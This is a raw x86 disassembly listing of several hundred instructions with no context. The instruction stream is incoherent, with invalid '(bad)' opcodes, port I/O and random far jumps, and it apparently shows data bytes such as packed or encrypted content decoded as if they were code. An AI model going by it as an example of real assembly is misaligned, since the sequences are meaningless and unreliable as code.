  421235:	cmp    esi,DWORD PTR [edi]
  421237:	shl    BYTE PTR [ecx-0x9],1
  42123a:	xor    eax,0x2a264549
  42123f:	push   ecx
  421240:	pop    ecx
  421241:	pop    esi
  421242:	fwait
  421243:	ins    BYTE PTR es:[edi],dx
  421244:	gs addr16 dec ebp
  421247:	jns    0x42122e
  421249:	push   ds
  42124a:	and    bl,al
  42124c:	scas   eax,DWORD PTR es:[edi]
  42124d:	xchg   ebp,eax
  42124e:	sub    BYTE PTR [ebx+eiz*8+0x3f],bh
  421252:	cmp    DWORD PTR [esi],esi
  421254:	dec    edx
  421255:	cld    
  421256:	(bad)  
  421257:	stc    
  421258:	pop    ebx
  421259:	dec    esi
  42125a:	xchg   ecx,eax
  42125b:	dec    bl
  42125d:	ins    BYTE PTR es:[edi],dx
  42125e:	sbb    al,0xd5
  421260:	and    esi,edi
  421262:	sar    BYTE PTR [edx+0x32],0x11
  421266:	pop    ebx
  421267:	adc    eax,DWORD PTR [edx+eax*2]
  42126a:	sub    BYTE PTR [ecx+0x22357395],ah
  421270:	clc    
  421271:	pop    esp
  421272:	shl    BYTE PTR [ebx],0x2d
  421275:	adc    bl,BYTE PTR [ebp+0x5c]
  421278:	ret    
  421279:	add    edi,edx
  42127b:	cs jle 0x4212f8
  42127e:	shl    eax,0x89
  421281:	push   0xffffff9c
  421283:	aas    
  421284:	out    0x67,eax
  421286:	adc    edi,DWORD PTR gs:[ebp+0x64]
  42128a:	aad    0xf9
  42128c:	push   edi
  42128d:	imul   esi,DWORD PTR [ebx+0x659bc31a],0x45
  421294:	cmp    DWORD PTR [edx],0xfffffffd
  421297:	pusha  
  421298:	adc    BYTE PTR [edx-0x48ba0652],0x64
  42129f:	jg     0x421301
  4212a1:	imul   ecx,DWORD PTR [esi-0x73d331a5],0x26dcdbd
  4212ab:	in     al,0xa5
  4212ad:	ret    0x213
  4212b0:	sub    eax,0x94f75b41
  4212b5:	sub    eax,0xb07e652f
  4212ba:	in     eax,0xd6
  4212bc:	pusha  
  4212bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212be:	mov    fs,WORD PTR [esi]
  4212c0:	lea    esi,[edx+edi*2+0x7c]
  4212c4:	and    DWORD PTR [esi],ebx
  4212c6:	mov    eax,ds:0xe2983f52
  4212cb:	mov    ds:0x8cdb2d6e,eax
  4212d0:	ret    
  4212d1:	xor    bh,ch
  4212d3:	dec    esp
  4212d4:	fsub   QWORD PTR [eax]
  4212d6:	(bad)  
  4212d7:	xor    BYTE PTR [esi],cl
  4212d9:	outs   dx,DWORD PTR ds:[esi]
  4212da:	xchg   ebx,eax
  4212db:	scas   eax,DWORD PTR es:[edi]
  4212dc:	aas    
  4212dd:	xchg   edi,eax
  4212de:	and    BYTE PTR [ebx],0xa0
  4212e1:	sti    
  4212e2:	mov    ah,0xae
  4212e4:	xor    DWORD PTR [esi],0x38250db1
  4212ea:	rcr    BYTE PTR [edx],cl
  4212ec:	mov    edx,0x1ca6b1af
  4212f1:	and    al,0xb0
  4212f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f4:	dec    ebp
  4212f5:	push   edx
  4212f6:	mov    al,0x92
  4212f8:	mov    ebp,edi
  4212fa:	adc    al,0xd5
  4212fc:	add    edx,DWORD PTR [ebp-0x52]
  4212ff:	and    eax,0x6fab9251
  421304:	jne    0x42136f
  421306:	cs push eax
  421308:	out    dx,al
  421309:	jge    0x4212df
  42130b:	sub    DWORD PTR [ecx+0x67989b16],ecx
  421311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421312:	lock mov al,0x57
  421315:	mov    dh,dl
  421317:	test   al,0x91
  421319:	cwde   
  42131a:	mov    fs,edi
  42131c:	push   edi
  42131d:	jp     0x4212d6
  42131f:	jge    0x4212bc
  421321:	sub    eax,0x7fdc7c8a
  421326:	fdivr  st(5),st
  421328:	pop    esp
  421329:	xchg   BYTE PTR [bp+0x1c],dh
  42132d:	lods   al,BYTE PTR ds:[esi]
  42132e:	cmp    al,0x2c
  421330:	jge    0x421364
  421332:	cwde   
  421333:	data16 or BYTE PTR [ebx-0x7a],bh
  421337:	inc    esp
  421338:	loopne 0x42131b
  42133a:	adc    BYTE PTR [ecx-0x12173b68],0xf9
  421341:	inc    edi
  421342:	inc    esi
  421343:	and    DWORD PTR [ecx*2+0x19befb39],edx
  42134a:	arpl   WORD PTR [eax+0x6e],sp
  42134d:	test   DWORD PTR [ecx],ebp
  42134f:	dec    ebp
  421350:	out    0xcb,eax
  421352:	cs ja  0x4212df
  421355:	rcr    ebx,0x16
  421358:	sbb    eax,0xd47012a2
  42135d:	int    0xdf
  42135f:	sub    esi,edi
  421361:	jp     0x42139e
  421363:	mov    esp,0xfed811f
  421368:	stc    
  421369:	enter  0x24f6,0x97
  42136d:	mov    esi,0xbccb51dc
  421372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421373:	test   BYTE PTR [esi],0xb4
  421376:	xchg   edi,eax
  421377:	push   ds
  421378:	sub    bl,BYTE PTR [ebp+0x59]
  42137b:	sahf   
  42137c:	pop    ds
  42137d:	sub    al,0xa
  42137f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421380:	pusha  
  421381:	int    0xb4
  421383:	and    eax,0xcaf28460
  421388:	push   edx
  421389:	mov    ch,0xbc
  42138b:	shl    edi,1
  42138d:	mov    ecx,edi
  42138f:	cmp    al,0x77
  421391:	ror    BYTE PTR ds:0x93f5b02f,1
  421397:	jge    0x4213d3
  421399:	sti    
  42139a:	pop    eax
  42139b:	test   eax,0xda80ee4d
  4213a0:	call   0xb97aa935
  4213a5:	sbb    eax,0x298b5726
  4213aa:	xchg   esi,eax
  4213ab:	mov    dl,0xbf
  4213ad:	rcl    BYTE PTR [ecx-0x52],0x3f
  4213b1:	sbb    ecx,DWORD PTR [eax]
  4213b3:	add    al,0x6b
  4213b5:	fwait
  4213b6:	inc    eax
  4213b7:	or     eax,0xe0068dda
  4213bc:	call   0x1c17e332
  4213c1:	or     edx,DWORD PTR [ebx+ecx*2+0x3e145346]
  4213c8:	out    0x72,eax
  4213ca:	in     al,dx
  4213cb:	and    eax,0xebcd1d74
  4213d0:	mov    fs,WORD PTR [eax+0x4bb156fd]
  4213d6:	call   0xeab71777
  4213db:	and    eax,0xe361993
  4213e0:	mov    dl,0xd2
  4213e2:	cli    
  4213e3:	cmp    BYTE PTR [ebx-0x6d],ah
  4213e6:	push   es
  4213e7:	xchg   DWORD PTR [ebx-0x404578b1],ebp
  4213ed:	or     ebp,eax
  4213ef:	sub    DWORD PTR [ebx+0x1cb9f481],esp
  4213f5:	inc    esp
  4213f6:	mov    bh,0x87
  4213f8:	popa   
  4213f9:	xor    ah,dh
  4213fb:	in     al,dx
  4213fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213fd:	xchg   ecx,eax
  4213fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ff:	dec    esi
  421400:	xor    eax,0x1fa0f82f
  421405:	das    
  421406:	push   ebp
  421407:	mov    edi,0xc2e63a08
  42140c:	or     ah,0x75
  42140f:	jbe    0x421464
  421411:	xchg   edi,eax
  421412:	ret    0x6f0b
  421415:	lock pop ecx
  421417:	mov    ?,WORD PTR [eax-0x22]
  42141a:	or     al,0x35
  42141c:	mov    ds:0xf1b27251,eax
  421421:	shl    ebp,0x3e
  421424:	mov    ch,0xb8
  421426:	cdq    
  421427:	mov    ds:0x60db0b95,al
  42142c:	bnd jo 0x421480
  42142f:	jo     0x4213f6
  421431:	cs xchg ecx,eax
  421433:	les    ebp,FWORD PTR [esi-0x79]
  421436:	cmp    ah,ah
  421438:	push   ss
  421439:	or     eax,0xf339375f
  42143e:	daa    
  42143f:	mov    edx,0x58fa9aae
  421444:	cmc    
  421445:	mov    edi,0x8529aacb
  42144a:	jge    0x421458
  42144c:	in     al,0x5e
  42144e:	jns    0x4214b5
  421450:	aad    0x6
  421452:	sar    BYTE PTR [edi+ebp*8+0x5c37a978],1
  421459:	retf   0x4d5f
  42145c:	or     BYTE PTR [ebx+edi*8+0x35],bl
  421460:	cmp    edi,DWORD PTR [edi+ebx*8+0xdd86a03]
  421467:	dec    edx
  421468:	fcmovne st,st(0)
  42146a:	adc    al,0x69
  42146c:	cmp    ebp,DWORD PTR [eax-0x6a]
  42146f:	mov    cl,0x98
  421471:	mov    eax,0xe24a4853
  421476:	adc    BYTE PTR [edx],0xc0
  421479:	cmovno eax,DWORD PTR [edi]
  42147c:	add    esp,eax
  42147e:	or     edi,DWORD PTR [ebp-0x1b112fe8]
  421484:	cmc    
  421485:	clc    
  421486:	add    eax,0xa5a4ea62
  42148b:	dec    esp
  42148c:	out    0x96,eax
  42148e:	sbb    edx,DWORD PTR [edi]
  421490:	cdq    
  421491:	push   ecx
  421492:	ror    DWORD PTR [edx+0x13],cl
  421495:	js     0x421490
  421497:	adc    ecx,DWORD PTR [ebp+0xc45743b]
  42149d:	jbe    0x4214cf
  42149f:	mov    ch,0xff
  4214a1:	in     eax,0xa2
  4214a3:	xchg   esi,eax
  4214a4:	ja     0x42150a
  4214a6:	mov    eax,ds:0xf2c9fac5
  4214ab:	shl    DWORD PTR [eax],0xe0
  4214ae:	push   ds
  4214af:	mov    al,ds:0xe732796a
  4214b4:	push   0x1effbf9
  4214b9:	dec    edi
  4214ba:	push   ebp
  4214bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214bc:	push   eax
  4214bd:	xor    dh,BYTE PTR [esi-0x7a062cd7]
  4214c3:	inc    eax
  4214c4:	jne    0x4214b4
  4214c6:	inc    eax
  4214c7:	cmp    eax,0x22dfa84f
  4214cc:	(bad)  
  4214cd:	loop   0x421479
  4214cf:	cmp    DWORD PTR [ebx+0x74],eax
  4214d2:	gs xchg edx,eax
  4214d4:	das    
  4214d5:	jae    0x421482
  4214d7:	popa   
  4214d8:	xchg   DWORD PTR fs:[esi-0x2da512bb],edi
  4214df:	adc    al,0xa
  4214e1:	loope  0x4214c3
  4214e3:	dec    ebx
  4214e4:	push   ds
  4214e5:	xchg   esi,eax
  4214e6:	arpl   bp,cx
  4214e8:	xchg   edx,eax
  4214e9:	mov    ah,0xa
  4214eb:	or     eax,0x9a258431
  4214f0:	sbb    al,0x9f
  4214f2:	retf   
  4214f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214f4:	jno    0x421477
  4214f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214f7:	mov    eax,ds:0x52bf0bd4
  4214fc:	xor    esi,eax
  4214fe:	outs   dx,DWORD PTR ds:[esi]
  4214ff:	push   esi
  421500:	mov    bh,0x3f
  421502:	jns    0x421511
  421504:	sbb    eax,0x2a5827da
  421509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42150a:	mov    ecx,0xf86ee127
  42150f:	mov    eax,0xd197fc11
  421514:	shl    al,cl
  421516:	out    dx,eax
  421517:	call   0xf8e4a80a
  42151c:	dec    ecx
  42151d:	scas   eax,DWORD PTR es:[edi]
  42151e:	xor    eax,0x4fc9c16e
  421523:	sub    ah,dl
  421525:	rol    BYTE PTR [ebx+0x35],cl
  421528:	aaa    
  421529:	out    0x88,al
  42152b:	jg     0x421516
  42152d:	sar    BYTE PTR [ecx-0x10],0xd1
  421531:	cmp    edx,DWORD PTR [ebx-0x72]
  421534:	cmp    eax,DWORD PTR [edi+ecx*1+0x6cc8b5ea]
  42153b:	xor    DWORD PTR [eax+0x75],0x0
  42153f:	jg     0x4215a2
  421541:	test   al,0xe
  421543:	nop
  421544:	push   edi
  421545:	sbb    al,0xf6
  421547:	(bad)  
  421548:	adc    BYTE PTR [eax-0x79],dh
  42154b:	mov    eax,ds:0x4634ca96
  421550:	mov    ch,0x2
  421552:	stc    
  421553:	adc    ebx,esp
  421555:	jmp    0x4215d2
  421557:	or     al,0xfd
  421559:	pop    es
  42155a:	stos   BYTE PTR es:[edi],al
  42155b:	mov    ds:0x52dc487f,eax
  421560:	shr    BYTE PTR [edi+edx*8-0xd],0x7d
  421565:	jno    0x42152d
  421567:	jle    0x4214ed
  421569:	sbb    DWORD PTR [eax+ebx*2-0x440eb91a],esp
  421570:	pop    edx
  421571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421572:	inc    ebx
  421573:	adc    dl,ah
  421575:	jl     0x421564
  421577:	inc    ecx
  421578:	outs   dx,BYTE PTR ds:[esi]
  421579:	xor    al,0x3f
  42157b:	fld    QWORD PTR [esi-0x34360d8]
  421581:	cmp    ebp,DWORD PTR [ebx+ebx*2]
  421584:	sar    ebp,cl
  421586:	mov    edx,0x9b27d85e
  42158b:	fidiv  DWORD PTR [ebp-0x455bf437]
  421591:	jmp    0x85b7:0xcb66e437
  421598:	and    BYTE PTR [ebp+0x29],0x7e
  42159c:	mov    ds:0xb2f50ed4,eax
  4215a1:	mov    cl,0xbd
  4215a3:	push   ds
  4215a4:	in     eax,0x22
  4215a6:	pop    esp
  4215a7:	pop    ss
  4215a8:	ds dec ebp
  4215aa:	les    edi,FWORD PTR [edi-0x9]
  4215ad:	cmp    ebx,DWORD PTR [esp+edx*4+0x47]
  4215b1:	int3   
  4215b2:	loop   0x4215f3
  4215b4:	add    dh,ah
  4215b6:	pop    esi
  4215b7:	jle    0x42157d
  4215b9:	mov    al,ds:0x8505082f
  4215be:	sahf   
  4215bf:	loope  0x4215f1
  4215c1:	fwait
  4215c2:	push   esi
  4215c3:	sub    dl,BYTE PTR [edi+0x4]
  4215c6:	hlt    
  4215c7:	jb     0x421620
  4215c9:	outs   dx,BYTE PTR ds:[esi]
  4215ca:	adc    eax,0xabf2a6b3
  4215cf:	fimul  DWORD PTR [esi+0x42bcfd53]
  4215d5:	cmp    esp,edi
  4215d7:	cmc    
  4215d8:	xor    dh,al
  4215da:	repz push ss
  4215dc:	ss test eax,0x17798522
  4215e2:	stos   BYTE PTR es:[edi],al
  4215e3:	les    edi,FWORD PTR [ecx-0x13fe67f2]
  4215e9:	mov    eax,DWORD PTR [ebx-0x80]
  4215ec:	dec    edx
  4215ed:	lea    edx,[ebp+edx*8-0x7513cf46]
  4215f4:	jp     0x4215cc
  4215f6:	aas    
  4215f7:	jg     0x421583
  4215f9:	sbb    ch,BYTE PTR ds:0xcdadbb9d
  4215ff:	iret   
  421600:	pop    esp
  421601:	idiv   DWORD PTR [ebx-0x28]
  421604:	and    al,0x18
  421606:	pushf  
  421607:	jecxz  0x4215cd
  421609:	daa    
  42160a:	stc    
  42160b:	(bad)
  42160e:	leave  
  42160f:	mov    al,ds:0xbec118a9
  421614:	mov    dl,0x23
  421616:	adc    ebx,esp
  421618:	pop    esi
  421619:	or     BYTE PTR [edx+0x46],bl
  42161c:	(bad)  
  42161d:	adc    esp,ebp
  42161f:	loop   0x4215ca
  421621:	sub    BYTE PTR [edx-0x32e9381d],al
  421627:	loop   0x4215b8
  421629:	inc    DWORD PTR [esi+0x5c8b9309]
  42162f:	mov    WORD PTR ds:[edx-0xa],fs
  421633:	into   
  421634:	arpl   bx,bp
  421636:	addr16 cld 
  421638:	jb     0x4215c8
  42163a:	adc    BYTE PTR [edi+0x267a97f7],dl
  421640:	fdivr  DWORD PTR [edx-0x33]
  421643:	cld    
  421644:	je     0x4216b0
  421646:	dec    eax
  421647:	outs   dx,BYTE PTR ds:[esi]
  421648:	sbb    DWORD PTR [ebx-0x6ed1839e],ebp
  42164e:	iret   
  42164f:	add    al,0xba
  421651:	or     esi,0xffffff82
  421654:	jo     0x4216d2
  421656:	dec    ebx
  421657:	popa   
  421658:	cmp    eax,0x687f692c
  42165d:	sbb    eax,DWORD PTR [esi+0x2f081986]
  421663:	or     DWORD PTR [ebx+0x3c],edx
  421666:	or     BYTE PTR [eax],0x4c
  421669:	imul   esp,DWORD PTR [esi-0x47],0x3900d63d
  421670:	outs   dx,DWORD PTR ds:[esi]
  421671:	test   al,0xb7
  421673:	xlat   BYTE PTR ds:[ebx]
  421674:	(bad)  
  421675:	dec    ebp
  421676:	into   
  421677:	push   ss
  421678:	xchg   DWORD PTR [esi],edi
  42167a:	cmp    BYTE PTR [esi+0x5c],bh
  42167d:	add    cl,BYTE PTR [ebx-0x71cc8c4]
  421683:	rcl    BYTE PTR [ecx+ebp*2],cl
  421686:	xor    bl,ah
  421688:	jmp    0x42160f
  42168a:	xchg   ebx,eax
  42168b:	mov    cs,WORD PTR [ebx-0x32a83b68]
  421691:	mov    eax,0xe635a4a0
  421696:	in     eax,dx
  421697:	add    bh,dh
  421699:	pushf  
  42169a:	mov    esi,0xc08ca82d
  42169f:	mov    WORD PTR [ebp-0x4a],gs
  4216a2:	loop   0x4216b9
  4216a4:	ins    DWORD PTR es:[edi],dx
  4216a5:	pop    ecx
  4216a6:	mov    DWORD PTR [ecx],edx
  4216a8:	and    dh,BYTE PTR [ebx]
  4216aa:	pop    eax
  4216ab:	ss xchg ebx,eax
  4216ad:	cmp    esi,DWORD PTR [edi]
  4216af:	add    bh,BYTE PTR [ebp+ecx*2+0x6dd39cd5]
  4216b6:	and    BYTE PTR [ecx],bl
  4216b8:	arpl   WORD PTR ds:0x67748cc2,dx
  4216be:	add    BYTE PTR [ecx],0x7a
  4216c1:	mov    ch,0xa7
  4216c3:	adc    dh,BYTE PTR [edi-0x78d2fc9d]
  4216c9:	xor    dl,BYTE PTR [edx+0x504296d6]
  4216cf:	inc    ebx
  4216d0:	lock push ebp
  4216d2:	or     dh,BYTE PTR [edi+0x437a9c5f]
  4216d8:	aam    0xab
  4216da:	sbb    DWORD PTR [ecx],0xf6f436e9
  4216e0:	retf   
  4216e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216e2:	jecxz  0x42173b
  4216e4:	pop    ss
  4216e5:	add    eax,0x403da423
  4216ea:	out    0xcd,eax
  4216ec:	cli    
  4216ed:	shr    al,cl
  4216ef:	mov    cs,WORD PTR [edi-0x58633820]
  4216f5:	out    dx,al
  4216f6:	cld    
  4216f7:	pop    es
  4216f8:	sbb    DWORD PTR [esi+0x47ae7772],ecx
  4216fe:	xor    eax,0x79196dc9
  421703:	mov    esp,0x288ac884
  421708:	xacquire xchg DWORD PTR [esi-0x2e],ebp
  42170c:	jmp    0x5111:0x7ef91a20
  421713:	lods   eax,DWORD PTR ds:[esi]
  421714:	outs   dx,BYTE PTR ds:[esi]
  421715:	cmp    ebp,DWORD PTR [esi]
  421717:	dec    ebp
  421718:	mov    al,0x4f
  42171a:	xchg   edx,eax
  42171b:	mov    dh,0x53
  42171d:	sbb    BYTE PTR [ecx],al
  42171f:	mov    edx,0x1a6bb4dd
  421724:	jo     0x4216e5
  421726:	outs   dx,BYTE PTR ds:[esi]
  421727:	outs   dx,BYTE PTR ds:[esi]
  421728:	ds je  0x42173f
  42172b:	aad    0x44
  42172d:	or     eax,0xe005810
  421732:	jmp    0xf437:0xedad0119
  421739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42173a:	xchg   edx,eax
  42173b:	cmovnp edi,DWORD PTR [eax+0x15]
  42173f:	xor    eax,DWORD PTR [edx]
  421741:	call   0x22cff97
  421746:	mov    al,0x32
  421748:	mov    dl,0x22
  42174a:	mov    dl,0x39
  42174c:	mov    WORD PTR [eax-0xb6ea8ec],?
  421752:	sbb    ebx,DWORD PTR [eax-0x2421d54]
  421758:	fsubr  DWORD PTR [ebx-0x7e]
  42175b:	dec    esp
  42175c:	imul   ecx,DWORD PTR [ebx],0xc0eaf6f9
  421762:	xor    al,0x22
  421764:	mov    ah,BYTE PTR [edx+ebp*4+0x29]
  421768:	xor    eax,0xc703f39d
  42176d:	pop    ss
  42176e:	les    ebp,FWORD PTR [ebx+0x49]
  421771:	mov    BYTE PTR [esi-0x6ca12f7e],ch
  421777:	lock ror BYTE PTR [ebp+0x6c53ec3a],cl
  42177e:	jl     0x42175f
  421780:	fcomp  DWORD PTR [esi]
  421782:	cli    
  421783:	sub    bl,BYTE PTR [edx+edi*4+0x30]
  421787:	(bad)  
  421788:	adc    dh,BYTE PTR [ebx]
  42178a:	icebp  
  42178b:	adc    BYTE PTR [ebx-0x3d],0xcb
  42178f:	xchg   edx,eax
  421790:	xchg   ebx,eax
  421791:	sub    eax,0x5e901cc3
  421796:	ss ret 0x277c
  42179a:	clc    
  42179b:	mov    al,ds:0x6f550530
  4217a0:	push   ds
  4217a1:	imul   edx,DWORD PTR [ecx-0x50e08da0],0x8dd51775
  4217ab:	push   0x6d
  4217ad:	mov    cl,0x54
  4217af:	pop    edi
  4217b0:	mov    cs,WORD PTR [edx+eax*2]
  4217b3:	in     eax,0xa6
  4217b5:	ret    0xb2ca
  4217b8:	sub    eax,0xd0a694b0
  4217bd:	mov    edx,0x5226875d
  4217c2:	cmp    dl,ah
  4217c4:	dec    ebx
  4217c5:	pop    es
  4217c6:	and    dh,bh
  4217c8:	retf   
  4217c9:	pop    es
  4217ca:	mov    ah,dh
  4217cc:	aam    0x8a
  4217ce:	aaa    
  4217cf:	std    
  4217d0:	adc    bl,al
  4217d2:	cmp    dl,BYTE PTR [edi-0x1487d9c9]
  4217d8:	(bad)
  4217db:	adc    DWORD PTR [ebp-0x2b780c66],edx
  4217e1:	xchg   ebp,eax
  4217e2:	pop    esi
  4217e3:	fwait
  4217e4:	cmp    BYTE PTR [edi+0x509ca3a4],dh
  4217ea:	js     0x421845
  4217ec:	(bad)  
  4217ed:	sti    
  4217ee:	das    
  4217ef:	mov    bh,0xcc
  4217f1:	(bad)  
  4217f3:	jo     0x421795
  4217f5:	mov    ah,bl
  4217f7:	inc    esi
  4217f8:	int    0x1
  4217fa:	dec    edi
  4217fb:	loopne 0x4217b8
  4217fd:	ret    
  4217fe:	push   esp
  4217ff:	mov    ch,0xff
  421801:	xchg   esi,eax
  421802:	(bad)  
  421803:	adc    al,0x41
  421805:	js     0x4217a6
  421807:	shl    DWORD PTR [edi],cl
  421809:	and    DWORD PTR [eax-0x12],ecx
  42180c:	sahf   
  42180d:	xor    ch,dh
  42180f:	fcomip st,st(5)
  421811:	sub    ch,dl
  421813:	jmp    0x4217fd
  421815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421816:	jmp    0x4217ee
  421818:	dec    BYTE PTR [esi+0x4cc767cf]
  42181e:	sti    
  42181f:	mov    esp,0x46ffe7d8
  421824:	push   ss
  421825:	shl    DWORD PTR [edi],cl
  421827:	xchg   ebp,eax
  421828:	test   BYTE PTR [ebx+edi*8],bh
  42182b:	push   eax
  42182c:	mov    ds:0x23d4296e,eax
  421831:	fcmove st,st(0)
  421833:	inc    ecx
  421834:	(bad)  
  421835:	aaa    
  421836:	loopne 0x42182b
  421838:	repz mov cl,cl
  42183b:	in     eax,dx
  42183c:	mov    ds:0x4ddecb81,al
  421841:	jle    0x4218ba
  421843:	mov    cl,0x1c
  421845:	popa   
  421846:	scas   eax,DWORD PTR es:[edi]
  421847:	(bad)  
  421848:	lock addr16 in eax,0x3e
  42184c:	adc    DWORD PTR [ebx-0x10],edx
  42184f:	ss or  ecx,eax
  421852:	lahf   
  421853:	in     eax,dx
  421854:	pop    bx
  421856:	jo     0x421849
  421858:	push   cs
  421859:	jg     0x4217ee
  42185b:	int3   
  42185c:	inc    ebp
  42185d:	aaa    
  42185e:	xchg   edx,eax
  42185f:	inc    ecx
  421860:	jp     0x42187f
  421862:	pop    ebp
  421863:	jl     0x421833
  421865:	push   eax
  421866:	xchg   ebx,eax
  421867:	add    dh,dh
  421869:	dec    eax
  42186a:	in     al,0xe1
  42186c:	gs scas eax,DWORD PTR es:[edi]
  42186e:	dec    eax
  42186f:	xchg   ebx,eax
  421870:	rol    DWORD PTR ds:0xde90b33e,cl
  421876:	fwait
  421877:	retf   
  421878:	nop
  421879:	arpl   WORD PTR [eax+ecx*1],di
  42187c:	inc    esp
  42187d:	push   eax
  42187e:	in     eax,dx
  42187f:	arpl   bp,sp
  421881:	pusha  
  421882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421883:	in     eax,0x8d
  421885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421886:	sub    edi,ebp
  421888:	fwait
  421889:	in     al,dx
  42188a:	lods   al,BYTE PTR ds:[esi]
  42188b:	lds    ecx,FWORD PTR [ecx+0x63c40769]
  421891:	div    BYTE PTR [ecx-0x29]
  421894:	test   DWORD PTR [ecx],eax
  421896:	ror    ah,1
  421898:	ret    
  421899:	pop    esi
  42189a:	addr16 aad 0xd2
  42189d:	jecxz  0x421902
  42189f:	fmul   QWORD PTR [esi]
  4218a1:	push   ds
  4218a2:	and    DWORD PTR ds:0x9cd17068,0xffffffdd
  4218a9:	mov    ch,BYTE PTR ds:0xa9fcbb39
  4218af:	test   al,0x79
  4218b1:	mov    cl,0x76
  4218b3:	in     eax,0xe8
  4218b5:	ret    
  4218b6:	xchg   edi,eax
  4218b7:	adc    eax,0xfdae8360
  4218bc:	mov    esp,0x53d3bfb2
  4218c1:	(bad)  
  4218c2:	mov    edi,0x8f5a2b29
  4218c7:	sbb    edi,ecx
  4218c9:	cmp    DWORD PTR [ecx],esp
  4218cb:	push   ebx
  4218cc:	imul   eax,DWORD PTR [edx+0x60],0xd33bde16
  4218d3:	xchg   edi,eax
  4218d4:	scas   eax,DWORD PTR es:[edi]
  4218d5:	mov    eax,ds:0x8400468e
  4218da:	dec    edi
  4218db:	mov    ch,BYTE PTR [ebx-0x71]
  4218de:	sub    al,BYTE PTR [ecx]
  4218e0:	ins    BYTE PTR es:[edi],dx
  4218e1:	popf   
  4218e2:	(bad)  
  4218e3:	fdiv   QWORD PTR [edi]
  4218e5:	in     eax,dx
  4218e6:	neg    DWORD PTR [ecx]
  4218e8:	xor    eax,0x8540a33c
  4218ed:	fisubr DWORD PTR [ecx]
  4218ef:	int    0xed
  4218f1:	jb     0x42188f
  4218f3:	inc    edi
  4218f4:	adc    eax,0x2ad5e1c8
  4218f9:	call   ebp
  4218fb:	mov    bl,0xa3
  4218fd:	ja     0x42196b
  4218ff:	iretw  
  421901:	mov    bl,0x2a
  421903:	sar    bl,1
  421905:	pop    ss
  421906:	inc    esi
  421907:	or     eax,0x891e722c
  42190c:	pusha  
  42190d:	je     0x4218bc
  42190f:	cmc    
  421910:	ficomp DWORD PTR [ecx+0x72]
  421913:	push   eax
  421914:	fsub   DWORD PTR [eax+0x61]
  421917:	adc    al,0x43
  421919:	cli    
  42191a:	ins    DWORD PTR es:[edi],dx
  42191b:	and    BYTE PTR [ebx],dh
  42191d:	aad    0x61
  42191f:	sbb    eax,0x4110ebc9
  421924:	xor    edx,DWORD PTR [edx+0x20]
  421927:	aas    
  421928:	dec    ecx
  421929:	pop    ebp
  42192a:	lea    eax,[edx-0x5232830a]
  421930:	(bad)  
  421932:	int    0xd8
  421934:	or     eax,DWORD PTR [edi]
  421936:	pop    esp
  421937:	fcom   QWORD PTR [ebp+0x359204c0]
  42193d:	adc    ebx,edx
  42193f:	and    eax,0x7673e516
  421944:	and    dh,BYTE PTR [ecx+edx*4+0x7d7cfe3d]
  42194b:	scas   eax,DWORD PTR es:[edi]
  42194c:	sbb    DWORD PTR [esi],edx
  42194e:	fldenv [ecx]
  421950:	ins    DWORD PTR es:[edi],dx
  421951:	or     al,bh
  421953:	sub    eax,0x177d1eaa
  421958:	sub    DWORD PTR [eax],0x65
  42195b:	int    0x9
  42195d:	or     esi,ecx
  42195f:	xchg   edi,eax
  421960:	sahf   
  421961:	popa   
  421962:	out    dx,eax
  421963:	les    ebx,FWORD PTR [esi-0x3361f13]
  421969:	mov    ebp,DWORD PTR [ebp+0x4aa9a954]
  42196f:	and    dh,BYTE PTR gs:[edi+0x4bdf4f67]
  421976:	dec    eax
  421977:	push   ebx
  421978:	jmp    0x4dc7:0xfcbb26ae
  42197f:	xchg   ah,al
  421981:	xchg   ecx,eax
  421982:	outs   dx,DWORD PTR ds:[esi]
  421983:	pop    ebp
  421984:	scas   al,BYTE PTR es:[edi]
  421985:	push   eax
  421986:	(bad)  
  421988:	adc    BYTE PTR [edi+0x7482845d],ah
  42198e:	test   al,0x76
  421990:	int3   
  421991:	std    
  421992:	jecxz  0x421982
  421994:	push   ss
  421995:	xor    DWORD PTR [ebx+0x3b],0x69
  421999:	js     0x4219ad
  42199b:	aam    0xd1
  42199d:	loop   0x42192a
  42199f:	popa   
  4219a0:	repnz sbb DWORD PTR [edi+0x2e],esp
  4219a4:	cmp    al,0x66
  4219a6:	inc    esp
  4219a7:	fs cli 
  4219a9:	test   eax,0x485d86c2
  4219ae:	adc    al,0x5
  4219b0:	scas   al,BYTE PTR es:[edi]
  4219b1:	jae    0x4219da
  4219b3:	inc    esp
  4219b4:	in     al,dx
  4219b5:	jo     0x421a00
  4219b7:	lds    edi,FWORD PTR [esi-0x16613886]
  4219bd:	sar    BYTE PTR [esi],cl
  4219bf:	test   DWORD PTR [bx+di+0x7f],ebp
  4219c3:	push   esp
  4219c4:	jae    0x4219d7
  4219c6:	fnstsw WORD PTR [eax+0x7c1d4e93]
  4219cc:	stos   BYTE PTR es:[edi],al
  4219cd:	inc    edx
  4219ce:	and    BYTE PTR [ecx-0x40f18b1c],bl
  4219d4:	push   eax
  4219d5:	cmp    al,0x61
  4219d7:	pushf  
  4219d8:	jb     0x4219a4
  4219da:	pop    esi
  4219db:	in     al,dx
  4219dc:	mov    BYTE PTR [edi+0x1],bl
  4219df:	jle    0x4219a4
  4219e1:	mov    bh,0xf1
  4219e3:	les    esi,FWORD PTR [ebp+0x377d3cac]
  4219e9:	jg     0x4219b0
  4219eb:	sub    al,0x92
  4219ed:	jnp    0x4219d7
  4219ef:	cwde   
  4219f0:	xchg   esp,ebp
  4219f2:	sub    ebx,ecx
